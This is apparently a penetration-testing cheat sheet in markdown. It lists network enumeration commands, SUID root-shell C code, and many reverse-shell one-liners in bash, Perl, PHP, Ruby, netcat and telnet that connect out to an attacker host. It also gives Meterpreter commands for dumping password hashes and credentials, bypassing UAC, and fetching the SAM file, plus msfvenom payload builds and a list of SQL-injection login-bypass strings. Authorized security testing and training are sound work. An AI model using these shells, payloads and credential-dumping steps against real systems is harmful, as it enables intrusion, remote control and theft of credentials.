# Pentest Cheat Sheet

#### Enumeration

- ##### General Enumeration:

    - ```nmap -vv -Pn -A -sC -sS -T 4 -p- <ip address>```
    
    - Verbose, SYN Stealth, Version info, and Scripts Against Service. 
    ```nmap -v -sS -A -T4 x.x.x.x```

    - ```netdiscover -r 192.168.1.0/24```


- ##### FTP Enumeration (21):

    - ```nmap –script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p <ip address> ```

- ##### SSH (22):

    - ```ssh <ip address> 22```

- ##### SMTP Enumeration (25):
    - ```nmap –script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 <ip address>```
    - ```telnet <ip address> 25```
    - ```nc -nvv <ip address> 25```
    - ```smtp-user-enum -U /usr/share/wordlists/names.txt -t <ip address> -m 150```


- ##### Web Enumeration (80/443):

    - ```nikto -h <ip address|url>```
    - **dirb**
    ```dirb <url>```
    ```dirb http://target.com /path/to/wordlist```
    ```dirb http://target.com /path/to/wordlist -X .sh,.txt,.htm,.php,.cgi,.html,.pl,.bak,.old```
    - **Dirsearch**
    ``` dirsearch -u target.com -e sh,txt,htm,php,cgi,html,pl,bak,old ```
    ```dirsearch -u target.com -e sh,txt,htm,php,cgi,html,pl,bak,old -w path/to/wordlist```
    ```dirsearch -u https://target.com -e .```
    - **Gobuster**
    ```gobuster -u https://target.com -w /usr/share/wordlists/dirb/big.txt```

- ##### Pop3 (110):

    - ```telnet <ip address> 110```

- ##### RPCBind (111):

    - ```rpcinfo –p <ip address>```
    - ```rpcclient -p 111 -U "" <ip address>```

- ##### SMB\RPC Enumeration (139/445):

    - **Enum4linux**
    ```enum4linux –a <ip address>```
    - ```nmap <ip address> --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse,smb-ls.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-print-text.nse,smb-psexec.nse,smb-security-mode.nse,smb-server-stats.nse,smb-system-info.nse,smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse```
    - ```nmap -vv --reason -Pn -sU -sV -p 137 --script="smb-vuln-ms06-025" --script-args="unsafe=1" <ip address>```
    - ```nmap -vv --reason -Pn -sU -sV -p 137 --script="smb-vuln-ms07-029" --script-args="unsafe=1" <ip address>```
    - ```nmap -vv --reason -Pn -sU -sV -p 137 --script="smb-vuln-ms08-067" --script-args="unsafe=1" <ip address>```
    - ```smbclient -L //<ip address>/```

- ##### SNMP Enumeration (161):

    - ```nmap -sT -p 161 <ip address> -oG snmp_results.txt```
    
    - ```nmap -sV -p 161 --script=snmp-info <ip address>```

    - ```snmpwalk -c public -v1 <ip address>```

    - ```snmpenum -t <ip address>```

- ##### MSSQL Enumeration (1433):

    - ```nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER <ip address>```

- ##### Oracle (1521):

    - ```tnscmd10g version -h <ip address>```

    - ```tnscmd10g status -h <ip address>```

- ##### Mysql Enumeration (3306):

    - **Try remote default Root access**
    ```mysql -h Target_ip -u root -p```

    - ```nmap -sV -Pn -vv <ip address> -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122```

- ##### DNS Zone Transfers:

    - ```nslookup -> set type=any -> ls -d blah.com```

    - ```dig axfr blah.com @ns1.blah.com```

    - ```dnsrecon -d TARGET -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml```

- ##### Mounting File Share

    - ```showmount -e IPADDR```

    - ```mount 192.168.1.1:/vol/share /mnt/nfs  -nolock```

        - mounts the share to /mnt/nfs without locking it

    - ```mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs```

        - Mount Windows CIFS / SMB share on Linux at /mnt/cifs if you remove password it will prompt on the CLI (more secure as it wont end up in bash_history)

    - ```net use Z: \\win-server\share password  /user:domain\janedoe /savecred /p:no```

        - Mount a Windows share on Windows from the command line

    - ```apt-get install smb4k –y```

        - Install smb4k on Kali, useful Linux GUI for browsing SMB shares

- ##### Fingerprinting:  Basic versioning / finger printing via displayed banner

    - ```nc -v 192.168.1.1 25```

    - ```telnet 192.168.1.1 25```

- ##### Exploit Research

    - ```searchsploit windows 2003 | grep -i local```

        - Search exploit-db for exploit, in this example windows 2003 + local esc

- ##### Compiling Exploits

    - ```gcc -o exploit exploit.c```

        - Compile C code, add –m32 after ‘gcc’ for compiling 32 bit code on 64 bit Linux

    - ```i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe```

        - Compile windows .exe on Linux

- ##### Packet Inspection:

    - ```tcpdump tcp port 80 -w output.pcap -i eth0```

        - tcpdump for port 80 on interface eth0, outputs to output.pcap

    
    

#### Shells & Reverse Shells

- ##### SUID C Shells

    - ###### bin/bash:
        

            int main(void){
                setresuid(0, 0, 0);
                system("/bin/bash");
            }

    - ###### bin/sh:

            int main(void){
                setresuid(0, 0, 0);
                system("/bin/sh");
            }

- ##### TTY Shell

    - ```python -c 'import pty;pty.spawn("/bin/bash")'```

    - ```echo os.system('/bin/bash')```

    - ```/bin/sh –i```

    - ```execute('/bin/sh')```

    - ```!sh```
        - Privilege Escalation via nmap
    
- ##### Fully Interactive TTY

    - ###### In reverse shell

            python -c 'import pty; pty.spawn("/bin/bash")'
            Ctrl-Z

    - ###### In Attacker console

            stty -a
            stty raw -echo
            fg

    - ###### In reverse shell

            reset
            export SHELL=bash
            export TERM=xterm-256color
            stty rows <num> columns <cols>


- ##### Spawn Ruby Shell

    - ```exec "/bin/sh"```

    - ```ruby -rsocket -e'f=TCPSocket.open("ATTACKING-IP",80).to_i;exec sprintf("/bin/sh -i <&%d >&%d```

- ##### Netcat

    - ```nc -e /bin/sh ATTACKING-IP 80```

    - ```/bin/sh | nc ATTACKING-IP 80```

    - ```rm -f /tmp/p; mknod /tmp/p p && nc ATTACKING-IP 4444 0/tmp/p```

- ##### Telnet Reverse Shell

    - ```rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p```

    - ```telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443```

- ##### PHP

    - ```php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'```

        - (Assumes TCP uses file descriptor 3. If it doesn’t work, try 4,5, or 6)

    - ```<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");?> ```


- ##### Bash

    - ```exec /bin/bash 0&0 2>&0```

    - ```0<&196;exec 196<>/dev/tcp/ATTACKING-IP/80; sh <&196 >&196 2>&196```

    - ```exec 5<>/dev/tcp/ATTACKING-IP/80 cat <&5 | while read line; do $line 2>&5 >&5; done```

    - ```bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1```

- ##### Perl

    - ```exec "/bin/sh";```

    - ```perl —e 'exec "/bin/sh";'```

    - ```perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```

    - ```perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' ```

        - Windows

    - ```perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'```

        - Windows

- ##### URL-Encoded Perl: Linux

        echo%20%27use%20Socket%3B%24i%3D%2210.11.0.245%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2fbin%2fsh%20-i%22%29%3B%7D%3B%27%20%3E%20%2ftmp%2fpew%20%26%26%20%2fusr%2fbin%2fperl%20%2ftmp%2fpew


#### Meterpreter

- ##### Windows reverse meterpreter payload

    - ```set payload windows/meterpreter/reverse_tcp```

        - Windows reverse tcp payload

- ##### Windows VNC Meterpreter payload

    - ```set payload windows/vncinject/reverse_tcp```

        - Meterpreter Windows VNC Payload

    - ```set ViewOnly false```

- ##### Linux Reverse Meterpreter payload

    - ```set payload linux/meterpreter/reverse_tcp```

        - Meterpreter Linux Reverse Payload

- ##### Meterpreter Cheat Sheet

    - ```upload file c:\\windows```

        - Meterpreter upload file to Windows target

    - ```download c:\\windows\\repair\\sam /tmp```

        - Meterpreter download file from Windows target

    - ```download c:\\windows\\repair\\sam /tmp```

        - Meterpreter download file from Windows target

    - ```execute -f c:\\windows\temp\exploit.exe```

        - Meterpreter run .exe on target – handy for executing uploaded exploits

    - ```execute -f cmd -c```

        - Creates new channel with cmd shell

    - ```ps```

        - Meterpreter show processes

    - ```shell```

        - Meterpreter get shell on the target

    - ```getsystem```

        - Meterpreter attempts priviledge escalation the target

    - ```hashdump```

        - Meterpreter attempts to dump the hashes on the target (must have privileges; try migrating to winlogon.exe if possible first)

    - ```portfwd add –l 3389 –p 3389 –r target```

        - Meterpreter create port forward to target machine

    - ```portfwd delete –l 3389 –p 3389 –r target```

        - Meterpreter delete port forward

    - ```use exploit/windows/local/bypassuac```

        - Bypass UAC on Windows 7 + Set target + arch, x86/64

    - ```use auxiliary/scanner/http/dir_scanner```

        - Metasploit HTTP directory scanner

    - ```use auxiliary/scanner/http/jboss_vulnscan```

        - Metasploit JBOSS vulnerability scanner

    - ```use auxiliary/scanner/mssql/mssql_login```

        - Metasploit MSSQL Credential Scanner

    - ```use auxiliary/scanner/mysql/mysql_version```

        - Metasploit MSSQL Version Scanner

    - ```use auxiliary/scanner/oracle/oracle_login```

        - Metasploit Oracle Login Module

    - ```use exploit/multi/script/web_delivery```

        - Metasploit powershell payload delivery module

    - ```post/windows/manage/powershell/exec_powershell```

        - Metasploit upload and run powershell script through a session

    - ```use exploit/multi/http/jboss_maindeployer```

        - Metasploit JBOSS deploy

    - ```use exploit/windows/mssql/mssql_payload```

        - Metasploit MSSQL payload

    - ```run post/windows/gather/win_privs```

        - Metasploit show privileges of current user

    - ```use post/windows/gather/credentials/gpp```

        - Metasploit grab GPP saved passwords

    - ```load kiwi```

    - ```creds_all```

        - Metasploit load Mimikatz/kiwi and get creds
    
    - ```run post/windows/gather/local_admin_search_enum```

        - Idenitfy other machines that the supplied domain user has administrative access to

    - ```set AUTORUNSCRIPT post/windows/manage/migrate```

- ##### Meterpreter Payloads

    - ```msfvenom –l```

        - List options

- ##### Binaries

    - ```msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf > shell.elf```

    - ```msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe > shell.exe```

    - ```msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho > shell.macho```

- ##### Web Payloads

    - ```msfvenom -p php/meterpreter/reverse_tcp LHOST= LPORT= -f raw > shell.php```

        - PHP

    - ```set payload php/meterpreter/reverse_tcp```

        - Listener

    - ```cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php```

        - PHP

    - ```msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp```

        - ASP

    - ```msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp```

        - JSP

    - ```msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war```

        - WAR

- ##### Scripting Payloads

    - ```msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py```

        - Python

    - ```msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh```

        - Bash

    - ```msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl```

        - Perl

- ##### Shellcode

    - ```msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f```

    - ```msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f```

    - ```msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f```

- ##### Handlers

    - ```exploit/multi/handler set PAYLOAD set LHOST set LPORT set ExitOnSession false exploit -j -z```

    - ```msfvenom exploit/multi/handler -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f > exploit.extension```

#### SQLInjections

- ##### SQL Injection Auth Bypass Payloads

        '-'
        ' '
        '&'
        '^'
        '*'
        ' or ''-'
        ' or '' '
        ' or ''&'
        ' or ''^'
        ' or ''*'
        "-"
        " "
        "&"
        "^"
        "*"
        " or ""-"
        " or "" "
        " or ""&"
        " or ""^"
        " or ""*"
        or true--
        " or true--
        ' or true--
        ") or true--
        ') or true--
        ' or 'x'='x
        ') or ('x')=('x
        ')) or (('x'))=(('x
        " or "x"="x
        ") or ("x")=("x
        ")) or (("x"))=(("x
        or 1=1
        or 1=1--
        or 1=1#
        or 1=1/*
        admin' --
        admin' #
        admin'/*
        admin' or '1'='1
        admin' or '1'='1'--
        admin' or '1'='1'#
        admin' or '1'='1'/*
        admin'or 1=1 or ''='
        admin' or 1=1
        admin' or 1=1--
        admin' or 1=1#
        admin' or 1=1/*
        admin') or ('1'='1
        admin') or ('1'='1'--
        admin') or ('1'='1'#
        admin') or ('1'='1'/*
        admin') or '1'='1
        admin') or '1'='1'--
        admin') or '1'='1'#
        admin') or '1'='1'/*
        1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
        admin" --
        admin" #
        admin"/*
        admin" or "1"="1
        admin" or "1"="1"--
        admin" or "1"="1"#
        admin" or "1"="1"/*
        admin"or 1=1 or ""="
        admin" or 1=1
        admin" or 1=1--
        admin" or 1=1#
        admin" or 1=1/*
        admin") or ("1"="1
        admin") or ("1"="1"--
        admin") or ("1"="1"#
        admin") or ("1"="1"/*
        admin") or "1"="1
        admin") or "1"="1"--
        admin") or "1"="1"#
        admin") or "1"="1"/*
        1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055

#### Miscellaneous

- ##### Web hosts

    - ```python -m SimpleHTTPServer 8000```
    
    - ```python3 -m http.server 8000```

- ##### Netcat

    - ###### Listener

        - ```nc -lvp <PORT>```

    - ###### Target

        - ```nc -e /bin/bash <listeneripaddress> <listenerport>```

        - ```ncat -v -l -p 7777 -e /bin/bash```

- ##### Magic Bytes

    - ###### Image File Formats

        - ###### PNG Image

            - Mnemonic: ```".PNG...."```

            - 	Signature: ```0x89 0x50 0x4E 0x47 0x0D 0x0A 0x1A 0x0A```

        - ###### BMP Image

            - Mnemonic: ```"BM"```

            - Signature: ```0x42 0x4D```

            